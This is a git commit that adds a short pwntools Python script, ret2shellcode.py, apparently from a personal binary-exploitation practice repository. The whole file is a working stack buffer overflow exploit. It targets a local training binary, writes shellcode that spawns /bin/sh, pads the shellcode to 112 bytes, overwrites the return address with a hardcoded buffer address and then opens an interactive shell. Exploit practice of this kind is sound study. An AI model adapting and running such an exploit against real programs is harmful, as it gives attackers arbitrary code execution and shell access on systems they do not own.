824095ec629e2c00584a58e17004c424542a4135
uniqueR <1321760271@qq.com>
2023-04-20 00:20:25 +0800

    add ret2shellcode

---
+++ ret2shellcode.py
@@ -0,0 +1,9 @@
+#!/usr/bin/env python
+from pwn import *
+
+sh = process(['/home/uniquer/code/pwn/binary/ret2shellcode'])
+shellcode = asm(shellcraft.sh())
+buf2_addr = 0x804a080
+
+sh.sendline(shellcode.ljust(112, b'A') + p32(buf2_addr))
+sh.interactive()
